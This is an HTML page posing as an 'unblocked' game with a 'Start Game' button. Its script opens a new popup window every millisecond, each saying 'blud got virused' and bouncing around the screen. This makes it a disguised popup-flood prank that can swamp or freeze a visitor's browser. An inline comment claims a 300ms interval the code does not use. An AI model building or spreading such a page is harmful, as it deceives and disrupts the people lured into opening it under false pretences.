
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>BS unblocked</title>
  <style>
    body {
      background-color: #1e1e2f;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: 'Arial', sans-serif;
    }

    button {
      padding: 20px 40px;
      font-size: 24px;
      font-weight: bold;
      color: #fff;
      background: linear-gradient(45deg, #ff416c, #ff4b2b);
      border: none;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(255, 65, 108, 0.7);
      cursor: pointer;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      animation: pulse 2s infinite;
    }

    button:hover {
      transform: scale(1.1);
      box-shadow: 0 0 30px rgba(255, 75, 43, 0.9);
    }

    @keyframes pulse {
      0% {
        box-shadow: 0 0 20px rgba(255, 65, 108, 0.7);
      }
      50% {
        box-shadow: 0 0 30px rgba(255, 75, 43, 1);
      }
      100% {
        box-shadow: 0 0 20px rgba(255, 65, 108, 0.7);
      }
    }
  </style>
</head>
<body>
  <button onclick="startOpeningPopups()">Start Game</button>

  <script>
    let popupInterval;

    function startOpeningPopups() {
      popupInterval = setInterval(() => {
        const width = 200;
        const height = 100;
        const x = Math.floor(Math.random() * (screen.availWidth - width));
        const y = Math.floor(Math.random() * (screen.availHeight - height));

        const popup = window.open(
          "",
          "_blank",
          `width=${width},height=${height},left=${x},top=${y}`
        );

        if (popup) {
          popup.document.write(`
            <html>
              <head>
                <title>Moving Popup</title>
                <style>
                  body {
                    background-color: #f0f0f0;
                    font-family: sans-serif;
                    margin: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    text-align: center;
                  }
                </style>
              </head>
              <body>
                <h3>blud got virused</h3>
                <script>
                  let dx = (Math.random() * 4 + 1) * (Math.random() < 0.5 ? -1 : 1);
                  let dy = (Math.random() * 4 + 1) * (Math.random() < 0.5 ? -1 : 1);

                  function movePopup() {
                    let x = window.screenX + dx;
                    let y = window.screenY + dy;

                    if (x <= 0 || x >= screen.availWidth - window.outerWidth) dx = -dx;
                    if (y <= 0 || y >= screen.availHeight - window.outerHeight) dy = -dy;

                    window.moveTo(x, y);
                    setTimeout(movePopup, 30);
                  }

                  movePopup();
                <\/script>
              </body>
            </html>
          `);
        } else {
          alert("Pop-up blocked! Please enable pop-ups for this site.");
          clearInterval(popupInterval);
        }
      }, 1); // open new popup every 300ms
    }
  </script>
</body>
</html>
